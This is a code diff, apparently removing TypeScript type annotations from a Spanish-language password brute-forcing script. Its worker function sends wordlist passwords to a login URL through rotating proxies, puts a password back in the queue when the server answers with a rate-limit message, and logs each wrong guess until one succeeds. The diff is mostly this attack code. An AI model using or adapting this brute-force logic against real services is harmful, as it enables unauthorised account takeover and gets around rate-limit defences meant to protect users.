@@ -70,7 +70,7 @@ let num_de_peticiones=0
 
 
 
-let promesas:any=[]
+let promesas=[]
 
 
 
@@ -78,7 +78,7 @@ let promesas:any=[]
 
 let header=yarg.header
 
-let contraseña_encontrada:boolean=false
+let contraseña_encontrada=false
 
 let a=0
 
@@ -98,7 +98,7 @@ let a=0
 
 
 
-async function worker(proxie:any){let i=0; 
+async function worker(proxie){let i=0; 
 
     
 
@@ -106,9 +106,9 @@ async function worker(proxie:any){let i=0;
 
        
 
-            axios.post(url,JSON.parse(body!),{httpAgent:proxie,httpsAgent:proxie,headers:{"Content-Type":header}})
+            axios.post(url,JSON.parse(body),{httpAgent:proxie,httpsAgent:proxie,headers:{"Content-Type":header}})
 
-     .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña!)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})
+     .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})
 
        
 
